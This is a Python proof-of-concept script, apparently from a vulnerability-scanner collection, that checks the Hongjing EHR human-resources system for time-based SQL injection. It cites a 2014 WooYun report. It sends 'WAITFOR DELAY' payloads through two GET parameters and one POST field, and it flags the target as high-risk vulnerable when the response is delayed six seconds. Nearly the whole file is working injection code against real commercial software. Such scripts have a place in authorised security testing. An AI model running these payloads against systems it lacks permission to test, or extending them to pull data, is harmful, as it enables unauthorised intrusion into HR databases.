#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 宏景EHR系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-075122
author: Lucifer
description: 1.由于/pos/posbusiness/train_get_code_tree.jsp页面参数codesetid未安全过滤导致SQL延时注射漏洞
             2.由于/servlet/sys/option/customreport/tree页面参数id未安全过滤导致SQL延时注射漏洞
             3.由于/system/report_orgtree.jsp页面参数report_type未安全过滤导致SQL延时注射漏洞
'''
import sys
import time
import json
import requests



class hjsoft_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = [r"/pos/posbusiness/train_get_code_tree.jsp?codesetid=1%27%20WAITFOR%20DELAY%20%270:0:6%27--",
                    r"/system/report_orgtree.jsp?unitcode=3&report_type=1%20WAITFOR%20DELAY%20%270:0:6%27--"]
        post_url = self.url + "/servlet/sys/option/customreport/tree"
        post_data = {
            "id" : "' WAITFOR DELAY '0:0:6'--",
            "codeset":"null",
            "method":"tree",
            "priv":"undefined",
            "level":"undefined",
            "node":"3"
        }
        for payload in payloads:
            vulnurl = self.url + payload
            start_time = time.time()

            try:
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if time.time() - start_time >= 6:
                    return "[+]存在宏景EHR系统 SQL注入漏洞...(高危)\t\tpayload: "+vulnurl

            except:
                return "[-]connect timeout"

        start_time = time.time()
        try:
            req2 = requests.post(post_url, headers=headers, data=post_data, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                return "[+]存在宏景EHR系统 SQL注入漏洞...(高危)\t\tpayload: "+post_url+"\npost: "+json.dumps(post_data, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = hjsoft_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
